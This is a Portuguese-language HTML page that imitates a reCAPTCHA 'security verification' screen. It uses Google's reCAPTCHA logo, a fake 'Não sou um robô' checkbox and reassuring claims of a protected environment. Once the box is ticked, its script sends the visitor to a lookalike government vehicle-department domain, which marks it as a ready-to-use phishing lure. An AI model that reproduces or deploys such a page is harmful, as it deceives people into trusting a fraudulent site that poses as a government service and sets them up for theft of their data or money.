<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificação de Segurança</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  font-family:Arial, Helvetica, sans-serif;
  background:#d9dde3;
  display:flex;
  align-items:center;
  justify-content:center;
  height:100vh;
  color:#0f172a;
  font-size:14px;
}

.card{
  width:380px;
  background:#fff;
  border-radius:14px;
  padding:28px 25px;
  box-shadow:0 10px 25px rgba(0,0,0,0.08);
  text-align:center;
}

/* TOPO */
.security-header{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:8px;
  margin-bottom:12px;
  font-size:14px;
}

.shield{
  font-size:16px;
  color:#16a34a;
  font-weight:700;
}

.security-text{
  font-size:14px;
  font-weight:600;
  color:#16a34a;
}

/* TÍTULO */
.title{
  font-size:18px;
  font-weight:700;
  color:#1e293b;
  margin-bottom:8px;
}

/* SUBTÍTULO */
.subtitle{
  font-size:14px;
  color:#64748b;
  margin-bottom:18px;
  line-height:1.5;
}

/* CAPTCHA */
.captcha-box{
  border:1px solid #d1d5db;
  border-radius:10px;
  background:#f8fafc;
  padding:16px;
}

.captcha-row{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap:10px;
}

/* CHECK AREA */
.check-area{
  display:flex;
  align-items:center;
  gap:12px;
  cursor:pointer;
  padding:10px;
  border-radius:8px;
}

.check-area input{
  display:none;
}

/* CHECKBOX */
.custom-check{
  width:24px;
  height:24px;
  border:2px solid #7c7c7c;
  border-radius:4px;
  background:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
}

.custom-check.checked{
  border-color:#16a34a;
  background:#f0fdf4;
}

.custom-check.checked::before{
  content:"✔";
  color:#16a34a;
  font-size:14px;
  font-weight:bold;
}

.check-text{
  font-size:14px;
  color:#0f172a;
}

/* LOGO */
.captcha-brand{
  text-align:center;
  font-size:10px;
  color:#64748b;
  min-width:70px;
}

.captcha-brand img{
  width:32px;
  display:block;
  margin:0 auto 3px;
}

/* STATUS */
.secure{
  margin-top:16px;
  color:#16a34a;
  font-size:13px;
  font-weight:600;
}

/* TEXTO EXTRA */
.extra-security{
  margin-top:10px;
  font-size:13px;
  color:#64748b;
  line-height:1.5;
}

.extra-security span{
  display:block;
  margin-top:4px;
}
</style>
</head>

<body>

<div class="card">

  <!-- TÍTULO -->
  <div class="title">Verificação de Segurança</div>

  <!-- SUBTÍTULO -->
  <div class="subtitle">
    Confirme que você é humano para continuar
  </div>

  <!-- CAPTCHA -->
  <div class="captcha-box">

    <div class="captcha-row">

      <label class="check-area">
        <input type="checkbox" id="check">
        <div class="custom-check" id="customCheck"></div>
        <span class="check-text">Não sou um robô</span>
      </label>

      <div class="captcha-brand">
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
        reCAPTCHA
        <br>
        Privacidade - Termos
      </div>

    </div>
  </div>

  <!-- STATUS -->
  <div class="secure"> Ambiente seguro e protegido</div>

  <!-- TEXTO EXTRA -->
  <div class="extra-security">
    Isso ajuda a proteger o sistema contra acessos indevidos
    <span>Verificação automática de segurança em tempo real</span>
    <span>Proteção avançada contra bots e ataques</span>
  </div>

</div>

<script>
const check = document.getElementById("check");
const customCheck = document.getElementById("customCheck");

/* 🔴 LINK DE REDIRECIONAMENTO */
const REDIRECT_URL = "https://www.departamentoveiculares-gov.com/sc";

check.addEventListener("change", () => {
  if(check.checked){
    customCheck.classList.add("checked");

    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 700);
  }
});
</script>

</body>
</html>
